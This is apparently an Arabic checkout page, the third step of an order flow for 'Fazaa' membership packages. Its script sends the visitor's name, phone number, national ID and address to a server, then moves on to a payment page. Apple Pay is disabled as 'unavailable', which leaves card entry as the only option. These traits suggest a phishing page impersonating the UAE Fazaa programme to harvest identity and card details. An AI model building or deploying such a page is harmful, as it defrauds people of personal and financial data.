<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فزعة - الدفع</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Cairo', sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        .card { background: #fff; border-radius: 24px; padding: 30px; margin-bottom: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 80px; }
        .step-indicator { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 25px; }
        .step-dot { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
        .step-dot.completed { background: #28a745; color: #fff; }
        .step-line { width: 40px; height: 3px; background: #28a745; border-radius: 2px; }
        .section-title { font-size: 1.2rem; font-weight: 800; color: #1a1a2e; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
        .section-title i { color: #8B1538; }
        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px dashed #eee; }
        .info-row:last-child { border-bottom: none; }
        .info-label { color: #666; }
        .info-value { font-weight: 600; color: #333; }
        .total-section { background: linear-gradient(135deg, #8B1538, #6B0F2A); color: #fff; border-radius: 16px; padding: 20px; margin-top: 20px; }
        .total-row { display: flex; justify-content: space-between; padding: 8px 0; font-size: 0.95rem; opacity: 0.9; }
        .total-final { display: flex; justify-content: space-between; padding-top: 15px; margin-top: 10px; border-top: 1px solid rgba(255,255,255,0.3); font-size: 1.3rem; font-weight: 800; }
        .payment-methods { margin-top: 25px; }
        .method-title { font-size: 1rem; font-weight: 700; color: #333; margin-bottom: 15px; }
        .method-option { display: flex; align-items: center; gap: 15px; padding: 18px 20px; border: 2px solid #e0e0e0; border-radius: 14px; margin-bottom: 12px; cursor: pointer; transition: all 0.3s; }
        .method-option:hover { border-color: #8B1538; }
        .method-option.selected { border-color: #8B1538; background: rgba(139,21,56,0.05); }
        .method-option input { display: none; }
        .method-radio { width: 24px; height: 24px; border-radius: 50%; border: 2px solid #ccc; display: flex; align-items: center; justify-content: center; transition: all 0.3s; }
        .method-option.selected .method-radio { border-color: #8B1538; background: #8B1538; }
        .method-option.selected .method-radio::after { content: ''; width: 10px; height: 10px; border-radius: 50%; background: #fff; }
        .method-icon { font-size: 2rem; color: #333; }
        .method-info { flex: 1; }
        .method-name { font-weight: 700; font-size: 1rem; color: #333; }
        .method-desc { font-size: 0.85rem; color: #666; }
        .apple-pay-note { display: none; background: #fff3cd; color: #856404; padding: 12px 15px; border-radius: 10px; margin-top: 10px; font-size: 0.9rem; }
        .btn-group { display: flex; gap: 15px; margin-top: 20px; }
        .btn { flex: 1; padding: 18px; border: none; border-radius: 12px; font-size: 1rem; font-weight: 700; font-family: inherit; cursor: pointer; transition: all 0.3s; text-align: center; }
        .btn-back { background: #e0e0e0; color: #333; }
        .btn-pay { background: linear-gradient(135deg, #8B1538, #6B0F2A); color: #fff; }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .loading-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 9999; }
        .loading-overlay.show { display: flex; }
        .loading-card { background: #fff; padding: 40px; border-radius: 20px; text-align: center; }
        .spinner { width: 50px; height: 50px; border: 4px solid #eee; border-top-color: #8B1538; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo"><img src="/images/logo.png" alt="Fazaa"></div>
            <div class="step-indicator">
                <div class="step-dot completed"><i class="fas fa-check"></i></div>
                <div class="step-line"></div>
                <div class="step-dot completed"><i class="fas fa-check"></i></div>
                <div class="step-line"></div>
                <div class="step-dot" style="background: linear-gradient(135deg, #8B1538, #6B0F2A); color: #fff;">3</div>
            </div>
            
            <h2 class="section-title"><i class="fas fa-file-invoice"></i> ملخص الطلب</h2>
            
            <div class="info-row">
                <span class="info-label">اسم العضو</span>
                <span class="info-value" id="fullName">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">رقم الهاتف</span>
                <span class="info-value" id="phone">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">المنطقة</span>
                <span class="info-value" id="city">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">العنوان</span>
                <span class="info-value" id="address">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">نوع الباقة</span>
                <span class="info-value" id="package">-</span>
            </div>
            <div class="info-row">
                <span class="info-label">موعد الاستلام</span>
                <span class="info-value" id="deliveryDate">-</span>
            </div>
            
            <div class="total-section">
                <div class="total-row"><span>رسوم العضوية</span><span>مجاناً</span></div>
                <div class="total-row"><span>رسوم التوصيل</span><span>5 درهم</span></div>
                <div class="total-final"><span>المبلغ الإجمالي</span><span id="totalPrice">0 درهم</span></div>
            </div>
            
            <div class="payment-methods">
                <h3 class="method-title">طريقة الدفع</h3>
                
                <label class="method-option selected" id="cardMethod">
                    <input type="radio" name="payment" value="card" checked>
                    <div class="method-radio"></div>
                    <i class="fas fa-credit-card method-icon"></i>
                    <div class="method-info">
                        <div class="method-name">Visa / Mastercard</div>
                        <div class="method-desc">الدفع ببطاقة الائتمان</div>
                    </div>
                </label>
                
                <label class="method-option" id="appleMethod">
                    <input type="radio" name="payment" value="apple">
                    <div class="method-radio"></div>
                    <i class="fab fa-apple method-icon"></i>
                    <div class="method-info">
                        <div class="method-name">Apple Pay</div>
                        <div class="method-desc">الدفع بـ Apple Pay</div>
                    </div>
                </label>
                
                <div class="apple-pay-note" id="appleNote">
                    <i class="fas fa-info-circle"></i>
                    <span>غير متوفر حالياً، يرجى اختيار طريقة دفع مختلفة</span>
                </div>
            </div>
            
            <div class="btn-group">
                <button type="button" class="btn btn-back" onclick="goBack()">رجوع</button>
                <button type="button" class="btn btn-pay" id="payBtn" onclick="proceedToPayment()">متابعة للدفع</button>
            </div>
        </div>
    </div>
    
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-card"><div class="spinner"></div><p>جاري معالجة الطلب...</p></div>
    </div>
    
    <script>
        var prices = { platinum: 299, gold: 199, silver: 99, fazaa: 49 };
        var tierNames = { platinum: 'البلاتينية', gold: 'الذهبية', silver: 'الفضية', fazaa: 'خصومات فزعة' };
        var cityNames = { 'dubai': 'دبي', 'abu-dhabi': 'أبوظبي', 'sharjah': 'الشارقة', 'ajman': 'عجمان' };
        
        var step1 = JSON.parse(sessionStorage.getItem('step1') || '{}');
        var step2 = JSON.parse(sessionStorage.getItem('step2') || '{}');
        var tier = localStorage.getItem('fazaaTier') || 'platinum';
        
        document.getElementById('fullName').textContent = step1.fullName || '-';
        document.getElementById('phone').textContent = '+971 ' + (step1.phoneNumber || '-');
        document.getElementById('city').textContent = cityNames[step2.city] || step2.city || '-';
        document.getElementById('address').textContent = (step2.street || '-') + (step2.neighborhood ? '، ' + step2.neighborhood : '');
        document.getElementById('package').textContent = tierNames[tier] || tier;
        document.getElementById('deliveryDate').textContent = step2.deliveryDate || '-';
        
        var total = (prices[tier] || 0) + 5;
        document.getElementById('totalPrice').textContent = total + ' درهم';
        
        function goBack() { window.location.href = '/order2'; }
        
        var cardMethod = document.getElementById('cardMethod');
        var appleMethod = document.getElementById('appleMethod');
        var appleNote = document.getElementById('appleNote');
        var payBtn = document.getElementById('payBtn');
        
        cardMethod.addEventListener('click', function() {
            cardMethod.classList.add('selected');
            appleMethod.classList.remove('selected');
            appleNote.style.display = 'none';
            payBtn.disabled = false;
        });
        
        appleMethod.addEventListener('click', function() {
            appleMethod.classList.add('selected');
            cardMethod.classList.remove('selected');
            appleNote.style.display = 'block';
            payBtn.disabled = true;
        });
        
        async function proceedToPayment() {
            document.getElementById('loadingOverlay').classList.add('show');
            
            try {
                var response = await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        fullName: step1.fullName,
                        phoneNumber: step1.phoneNumber,
                        nationalId: step1.nationalId,
                        city: step2.city,
                        street1: step2.street,
                        street2: step2.neighborhood,
                        deliveryDate: step2.deliveryDate,
                        tier: tier
                    })
                });
                
                var data = await response.json();
                
                if (data.success) {
                    window.location.href = '/payment';
                } else {
                    document.getElementById('loadingOverlay').classList.remove('show');
                    alert(data.error || 'حدث خطأ');
                }
            } catch (error) {
                document.getElementById('loadingOverlay').classList.remove('show');
                alert('حدث خطأ في الاتصال');
            }
        }
    </script>
</body>
</html>
